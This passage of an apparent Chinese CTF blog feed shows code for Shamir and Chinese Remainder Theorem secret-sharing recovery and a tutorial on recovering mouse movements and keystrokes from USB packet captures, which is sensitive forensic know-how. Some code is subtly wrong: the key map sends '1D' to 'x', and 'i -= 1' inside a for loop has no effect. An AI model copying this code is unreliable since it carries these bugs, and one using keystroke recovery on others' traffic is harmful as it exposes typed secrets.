个部分。</p><p>运行效果：</p><p><code>(k, n) = (3, 6)</code></p><p><img src="https://img.tucang.cc/api/image/show/6bd774ffb9656581baf832f4593bf977" alt="image-20200921203437444"></p><h3 id="秘密恢复"><a href="#秘密恢复" class="headerlink" title="秘密恢复"></a>秘密恢复</h3><p>首先输入 k，然后输入素数 p，接着将 <code>Di</code> 的值输入进去，以 <code>(x, y)</code> 的形式打包存储进一个列表中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">recoverD = []<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Now to recover your secret&quot;</span>)<br>k = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Subset: &quot;</span>))<br>p = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Prime: &quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Now to input your point like x,y&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>x, y = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Input point &quot;</span> + <span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>) + <span class="hljs-string">&quot;: &quot;</span>).split(<span class="hljs-string">&#x27;,&#x27;</span>))<br>recoverD.append((x, y))<br></code></pre></td></tr></table></figure><p>数据获取完毕后，利用拉格朗日插值法进行计算，将 <code>i</code> 值和 <code>Di</code> 的值分开各位一个列表，然后每一次计算每一个小块的 <code>q(x)</code>。对于多项式的计算，形如 <code>(x-1)(x-2) </code>，这里为了偷懒我利用了 <code>numpy</code> 里的 <code>array</code>，并利用它的性质计算多项式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">l</span>(<span class="hljs-params">D</span>): <span class="hljs-comment"># 拉格朗日插值法</span><br>x_s, y_s = <span class="hljs-built_in">zip</span>(*D)<br>lst = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(x_s)):<br>others = <span class="hljs-built_in">list</span>(x_s)<br>cur = others.pop(i)<br>dxs = cal(cur, others)<br>fm = fm_cal(cur, others)<br><br>lst.append((dxs, fm))<br><br><span class="hljs-keyword">return</span> lst<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cal</span>(<span class="hljs-params">x, others</span>): <span class="hljs-comment"># 计算多项式，即分子</span><br>re = np.array([<span class="hljs-number">1</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> others:<br>p = np.array([<span class="hljs-number">1</span>, -i])<br>re = np.convolve(re, p)<br><br><span class="hljs-keyword">return</span> re<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fm_cal</span>(<span class="hljs-params">x, others</span>): <span class="hljs-comment"># 计算分母</span><br>re = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> others:<br>re *= (x-i)<br><br><span class="hljs-keyword">return</span> re<br></code></pre></td></tr></table></figure><p>待计算好返回每一个 <code>Di</code> 的分子和分母后，即可以计算 <code>i</code> 模 <code>p</code> 的逆元，利用 <code>gmpy2.invert</code> 来计算，求出后将各项相加，即是多项式方程，其中常数项位秘密，可利用 <code>libnum.n2s()</code> 恢复成字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_secret</span>(<span class="hljs-params">k, p, D</span>):<br>re = l(D)<br>cnt = <span class="hljs-number">0</span><br>fz, fm = <span class="hljs-built_in">zip</span>(*re)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>inv = gmpy2.invert(fm[i], p)<br>cnt += D[i][-<span class="hljs-number">1</span>] * inv * fz[i][-<span class="hljs-number">1</span>]<br>cnt %= p<br><br><span class="hljs-keyword">return</span> libnum.n2s(cnt)<br></code></pre></td></tr></table></figure><p>利用上面的秘密分发的数据进行恢复：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">如：<br><span class="hljs-symbol">Prime:</span> <span class="hljs-number">167569419418447</span><br><span class="hljs-symbol">Subset:</span> <span class="hljs-number">3</span><br><span class="hljs-symbol">D2:</span>(<span class="hljs-number">2</span>, <span class="hljs-number">59529348878006</span>)<br><span class="hljs-symbol">D4:</span>(<span class="hljs-number">4</span>, <span class="hljs-number">21970926061031</span>)<br><span class="hljs-symbol">D5:</span>(<span class="hljs-number">5</span>, <span class="hljs-number">35309714193955</span>)<br></code></pre></td></tr></table></figure><p>效果图如下：</p><p><img src="https://img.tucang.cc/api/image/show/e8cf2aeb097cb17e936ec8b20e8bd307" alt="image-20200921211306075"></p>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>中国剩余定理的 (k, n) 门限方案</title>
    <link href="/2020/09/21/crt/"/>
    <url>/2020/09/21/crt/</url>
    
    <content type="html"><![CDATA[<h1 id="秘密分发"><a href="#秘密分发" class="headerlink" title="秘密分发"></a>秘密分发</h1><p>秘密 D 输入，k，n的输入和 p 的获取和上面一样，这里不多说，获取完后，要生成一个集合 D，其中有 n 个 <code>di</code>，且满足条件</p><ol><li>p &gt; D</li><li><code>d1&lt;d2&lt;...&lt;dn</code></li><li>p 与任意 <code>di</code> 互素</li><li><code>di</code> 之间两两互素</li><li>最小的 k 个 <code>di</code> 的乘积 &gt; p 与 最大的 k-1 个 <code>di</code> 的乘积</li></ol><p>这里采取的方法是</p><ol><li>还是用 <code>getPrime</code> 函数，参数字节数为 max(D字节数，n字节数) + 2，并在后面判断若p&lt;D或n，重新取值，保证 p &gt; D,n</li><li>用 <code>getPrime</code> 函数取 n 个素数，然后进行 <code>sort()</code> 排列，素数间一定两两互素，解决条件3，4</li><li>判断 ‘最小的 k 个 <code>di</code> 的乘积 &gt; p 与 最大的 k-1 个 <code>di</code> 的乘积’ 是否成立，若不成立，重新取值</li></ol><p>生成 <code>di</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_d</span>(<span class="hljs-params">bit, n</span>): <span class="hljs-comment"># 生成d序列</span><br>d = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>tmp = getPrime(<span class="hljs-built_in">int</span>(bit) + <span class="hljs-number">3</span>)<br><span class="hljs-keyword">if</span> tmp <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> d:<br>d.append(tmp)<br><span class="hljs-keyword">else</span>:<br>i -= <span class="hljs-number">1</span><br>d.sort()<br><br><span class="hljs-keyword">return</span> d<br></code></pre></td></tr></table></figure><p>生成完之后进行检查：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">d, p, k, n</span>): <span class="hljs-comment"># 检查是否符合条件</span><br>mm = p <span class="hljs-comment"># p与最大的k-1个di的乘积</span><br>m = getM(d, k)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n-k+<span class="hljs-number">1</span>, n):<br>mm *= d[i]<br><span class="hljs-keyword">if</span>(m &gt; mm):<br><span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getM</span>(<span class="hljs-params">d, k</span>): <span class="hljs-comment"># k个最小di的乘积</span><br>m = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>m *= d[i]<br><span class="hljs-keyword">return</span> m<br><br><br>d = make_d(bit, n)<br><span class="hljs-keyword">while</span> (<span class="hljs-keyword">not</span> check(d, p, k, n)):<br>d = make_d(bit, n)<br><span class="hljs-built_in">print</span>(d)<br></code></pre></td></tr></table></figure><p>在 <code>[0,(m/p)-1]</code> 的范围内随机取一个 r，计算 <code>D&#39; = D + rp</code>，最后计算出 n 个 $Di$ 块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">m = getM(d, k)<br>rand = random.randint(<span class="hljs-number">0</span>, m//p-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r:&quot;</span>, rand)<br><br>_D = D + rand*p<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br><span class="hljs-built_in">print</span>((_D % d[i], d[i]))<br></code></pre></td></tr></table></figure><p>只要知道上述 <code>Di</code> 块中的任意 k 个，就可以应用中国剩余定理求出 D’。</p><p>公开 p 和 r，并分发每一份数据给每个秘密共享者。</p><p>效果图：</p><p><img src="https://img.tucang.cc/api/image/show/f6dfec7277efc4de3bdb6b6947a82a79" alt="image-20200922095121102"></p><h1 id="秘密恢复"><a href="#秘密恢复" class="headerlink" title="秘密恢复"></a>秘密恢复</h1><p>输入 k，p 和每一份 <code>Di</code>，计算出 <code>m = d1d2..dk </code> ，为了应用中国剩余定理，首先求出 <code>inv(m/di, di)</code>，即 <code>m/di</code> 与 <code>di</code> 的逆元，然后计算出 ($\sum_{m&#x3D;0}^k \frac{m}{di}yiDi$) mod m</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover</span>():<br>k = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;k: &quot;</span>))<br>rand = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;r: &quot;</span>))<br>p = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Prime: &quot;</span>))<br>m1 = <span class="hljs-number">1</span><br>recoverD = []<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Now to input your point like x,y&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>x, y = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Input point &quot;</span> + <span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>) + <span class="hljs-string">&quot;: &quot;</span>).split(<span class="hljs-string">&#x27;,&#x27;</span>))<br>recoverD.append((x, y))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> recoverD:<br>m1 *= i[<span class="hljs-number">1</span>]<br>result = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> recoverD:<br>y = gmpy2.invert(m1//i[<span class="hljs-number">1</span>], i[<span class="hljs-number">1</span>])<br>result += m1//i[<span class="hljs-number">1</span>]*y*i[<span class="hljs-number">0</span>]<br><br>DD = result % m1<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;===============Result===============&quot;</span>)<br><span class="hljs-built_in">print</span>(libnum.n2s(DD-rand*p))<br></code></pre></td></tr></table></figure><p>利用上面的数据进行计算：</p><p><img src="https://img.tucang.cc/api/image/show/d8baa8f5fd075574a4f96604e555fb7a" alt="image-20200922095249345"></p>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>USB流量数据包的取证初探以及CTF中的解题应用</title>
    <link href="/2020/09/20/usb_forensics/"/>
    <url>/2020/09/20/usb_forensics/</url>
    
    <content type="html"><![CDATA[<p>有关<code>USB</code>协议的详细信息，请参见<code>wikishark</code> <code>wiki</code>：<a href="https://wiki.wireshark.org/USB">https</a> : <a href="https://wiki.wireshark.org/USB">&#x2F;&#x2F;wiki.wireshark.org&#x2F;USB</a></p><ul><li><p>鼠标流量取证</p><blockquote><p>每个数据包的数据区有四个字节。第一个字节代表按钮。取0x00时，表示没有按钮。为0x01时，表示左键。当它是0x02时，表示当前按钮是右键。第二个字节可以被认为是带符号的字节类型，最高位是符号位。当该值为正时，表示鼠标水平向右移动多少像素。当它为负数时，表示向左移动了多少像素。第三个字节类似于第二个字节，代表垂直向上和向下移动的偏移量。</p></blockquote><p>当获取了这些点的信息之后，我们就可以恢复鼠标的轨迹。</p><p>要想有流量包，必须先得想办法抓包，USB流量的捕获可以使用wireshark或者usbpcap来进行，最新版本的wireshark已经支持USB接口的捕获，且在安装时会提示usbpcap的安装，当前网上已有相关中文资料对wireshark抓取usb数据包的方法进行讲解，感兴趣的可以阅读参考链接。该软件的下载地址为 <code>http://desowin.org/usbpcap/</code>，可支持32位以及64位的winxp至win10操作系统，安装完成后须重启机器或者按照提示选择重启所有USB设备。</p><p>我们以自己鼠标为例，打开wireshark，选取我们usb的监听</p><p><img src="https://img.tucang.cc/api/image/show/7f8b39853abac3ce3fea89f588dfcd9b" alt="image-20200920223057765"></p><p>然后用鼠标进行滑动等操作，当然点击左键和右键都是有不一样的数据。</p><p><img src="https://img.tucang.cc/api/image/show/fc664c22a3ffdd7cf9b66354f85f64b8" alt="image-20200920222857520"></p><p>抓取到后我们保存流量包，这里保存为 <code>mice.pcapng</code>，我们先来分析一下这个流量包。</p><p>因为本来就插着鼠标，我们抓取的流量也看不到认证始别之类的流量，后续在具体题目中会有提到。</p><p><img src="https://img.tucang.cc/api/image/show/38974d13205a371f2e669e850be2db1f" alt="image-20200920225040744"></p><p>不同的鼠标抓到的流量不一样，一般的鼠标流量是四个字节，事实上，起作用的只是三个相邻的字节，比如我这里抓到的是5个字节，可以观察看到起作用的是2，3，4个字节，因此我们需要操作的数据在 01<code>00fffb</code>00上。</p><p>tshark 安装:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt-get install tshark -y<br></code></pre></td></tr></table></figure><p>接下来，使用 tshark 对数据进行提取：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ tshark -r mice.pcapng -T fields -e usb.capdata &gt; micedata<br></code></pre></td></tr></table></figure><p>对 tshark 更详细的命令，参考 <a href="https://www.wireshark.org/docs/man-pages/tshark.html">https://www.wireshark.org/docs/man-pages/tshark.html</a></p><p><img src="https://img.tucang.cc/api/image/show/f60388b58ee8022c1e8ff9dfc662f08e" alt="image-20200920225420561"></p><p>数据大概是长这样子的</p><p><img src="https://img.tucang.cc/api/image/show/5d59dea4f9d0e663f104280e180a0bd7" alt="image-20200920225505545"></p><p>这里提一下，测试发现，在Kali，Windows里面提取的时候，可能会出现没有冒号的情况，这样后期用脚本处理的时候就得修改一下，大概是版本的问题，在Ubuntu 16.04里，apt 默认安装的 tshark 是</p><p><img src="https://img.tucang.cc/api/image/show/fa0ec48e3cfdd4d1940611bb560d70a8" alt="image-20200920225626489"></p><p>而在Kali和Windows里（这里以Windows为例），版本可能比较新</p><p><img src="https://img.tucang.cc/api/image/show/a60264fb90dcc2218922aedf22037ec6" alt="image-20200920225746114"></p><p>提取的数据大概长这样的：</p><p><img src="https://img.tucang.cc/api/image/show/1a1dd86f1db5dc9b714feb6d30e1cd72" alt="image-20200920225902708"></p><p>不影响分析，但如果使用别人的脚本或者代码，软件时记得根据自己的情况修改。</p><p>提取脚本后，我们对需要的数据位进行一个解析，通过它的方向，偏移量，我们得计算出它的像素点位置，然后借助 <code>gnuplot</code> 等绘图工具进行恢复：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">awk -F: <span class="hljs-string">&#x27;function comp(v)&#123;if(v&gt;127)v-=256;return v&#125;&#123;x+=comp(strtonum(&quot;0x&quot;$3));y+=comp(strtonum(&quot;0x&quot;$4))&#125;$2==&quot;01&quot;&#123;print x,y&#125;&#x27;</span> micedata &gt; pointdata<br></code></pre></td></tr></table></figure><p>这里将我们的数据处理好，以点的方式保存在一个文件里，如果出现类似这样的错误：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">awk: line 2: <span class="hljs-keyword">function</span> strtonum never defined<br></code></pre></td></tr></table></figure><p>安装一下 awk 即可：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo apt-get install gawk<br></code></pre></td></tr></table></figure><p>处理后的数据大概长这样的：</p><p><img src="https://img.tucang.cc/api/image/show/a2c39d37da48dcd68ea39ec8ad935a2e" alt="image-20200920231252178"></p><p>接下来我们使用 <code>gnuplot</code> 来进行绘制：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-variable">$gnuplot</span><br>G N U P L O T<br>Version 5.0 patchlevel 3    last modified 2016-02-21 <br>Copyright (C) 1986-1993, 1998, 2004, 2007-2016<br>Thomas Williams, Colin Kelley and many others<br>gnuplot home:     http://www.gnuplot.info<br>faq, bugs, etc:   <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;help FAQ&quot;</span><br>immediate <span class="hljs-built_in">help</span>:   <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;help&quot;</span>  (plot window: hit <span class="hljs-string">&#x27;h&#x27;</span>)<br>Terminal <span class="hljs-built_in">type</span> <span class="hljs-built_in">set</span> to <span class="hljs-string">&#x27;qt&#x27;</span><br>gnuplot&gt; plot <span class="hljs-string">&quot;pointdata&quot;</span><br></code></pre></td></tr></table></figure><p>于是我们可以看到鼠标的轨迹了</p><p><img src="https://img.tucang.cc/api/image/show/258aa73a0b14607a9637d4579eb94882" alt="image-20200920231516224"></p><p>当然这是反着的，我们用一些图片处理软件处理一下，就可以看到轨迹内容了，是一个 ‘flag’ 字样的轨迹</p><p><img src="https://img.tucang.cc/api/image/show/fb0d19a070a78f7b558af4bfa41ca558" alt="img"></p><p>然后我们用一道CTF题来举例子，题目来源： Google CTF 2016，同时也是 ciscn 2020 华中赛区的misc题（flag都没改），题目数据包可以在这获取：<a href="https://rootusers.com/wp-content/uploads/2016/05/capture.pcapng">https://rootusers.com/wp-content/uploads/2016/05/capture.pcapng</a></p><p>打开数据包进行分析，可以看到认证等的信息，我们也可以从里面看到这个设备的信息，貌似是罗技的鼠标，然后我们用同样的方法对它的usb数据进行提取。</p><p><img src="https://img.tucang.cc/api/image/show/5a13bbad13ff258ec155a4d046b1d4c2" alt="image-20200920232138818"></p><p>这里的数据是四个字节的，那么我们基本可以判断是usb鼠标的取证了。</p><p><img src="https://img.tucang.cc/api/image/show/68051b75ed56488fa42b5f8e81dd7ade" alt="image-20200920232331167"></p><p>接着用绘图工具，画出来的还是反的，但是难不倒ctfer。</p><p><img src="https://img.tucang.cc/api/image/show/37443d7ba6103166fa4b92f91f85ba21" alt="image-20200920232437388"></p><p>处理过后是这样的：</p><p><img src="https://img.tucang.cc/api/image/show/02105d43348243a970f21d816134b948" alt="img"></p><p>当然对于鼠标usb的取证也有一些脚本可以使用，比如 <code>https://github.com/WangYihang/UsbMiceDataHacker</code></p><p>下载 <code>git clone https://github.com/WangYihang/UsbMiceDataHacker</code></p><p>使用 <code>python UsbMiceDataHacker.py capture.pacpng out.png</code> </p><p><img src="https://img.tucang.cc/api/image/show/0f3478a3d7ecdf85e465a9fa0afeb33f" alt="image-20200920232824264"></p><p>使用这个脚本需要下载一些模块和软件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pip install numpy<br>$ pip install matplotlib<br>$ apt-get install python-tk<br></code></pre></td></tr></table></figure></li><li><p>键盘流量取证</p><blockquote><p>键盘数据包的数据长度为8个字节，和击键信息被集中在第三个字节，每次key stroke都会产生一个keyboard event usb packet。</p></blockquote><p>在这里我们可以找到这个值与具体键位的对应关系：<a href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf">http://www.usb.org/developers/hidpage/Hut1_12v2.pdf</a></p><p><img src="https://img.tucang.cc/api/image/show/5f7cc8d56e2f35b5782d89c4ea3e43f8" alt="img"></p><p>同样地，我们用 Wireshark 抓取了我们 usb 键盘的流量，保存为 kb.pcapng，当没有什么混淆的时候，其实硬看也是可以一点一点看出来的，当时写 SarCTF 的时候，我还是先硬看出来最后才写的脚本。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#键盘数据转换，注意这个是没有用:分割的版本</span><br>FILE = <span class="hljs-string">&quot;data&quot;</span><br><br>switcher = &#123;<br><span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-comment"># or A</span><br><span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-comment"># or B</span><br><span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-comment"># or C</span><br><span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-comment"># or D</span><br><span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-comment"># or E</span><br><span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-comment"># or F</span><br><span class="hljs-string">&quot;0A&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-comment"># or G</span><br><span class="hljs-string">&quot;0B&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-comment"># or H</span><br><span class="hljs-string">&quot;0C&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-comment"># or I</span><br><span class="hljs-string">&quot;0D&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-comment"># or J</span><br><span class="hljs-string">&quot;0E&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-comment"># or K</span><br><span class="hljs-string">&quot;0F&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-comment"># or L</span><br><span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-comment"># or M</span><br><span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-comment"># or N</span><br><span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-comment"># or O</span><br><span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-comment"># or P</span><br><span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-comment"># or Q</span><br><span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-comment"># or R</span><br><span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-comment"># or S</span><br><span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-comment"># or T</span><br><span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-comment"># or U</span><br><span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-comment"># or V</span><br><span class="hljs-string">&quot;1A&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-comment"># or W</span><br><span class="hljs-string">&quot;1B&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-comment"># or X</span><br><span class="hljs-string">&quot;1C&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-comment"># or Y</span><br><span class="hljs-string">&quot;1D&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-comment"># or Z</span><br><span class="hljs-string">&quot;1E&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-comment"># or !</span><br><span class="hljs-string">&quot;1F&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-comment"># or @</span><br><span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-comment"># or #</span><br><span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-comment"># or $</span><br><span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-comment"># or %</span><br><span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-comment"># or ^</span><br><span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-comment"># or &amp;</span><br><span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-comment"># or *</span><br><span class="hljs-string">&quot;26&quot;</span>:<span 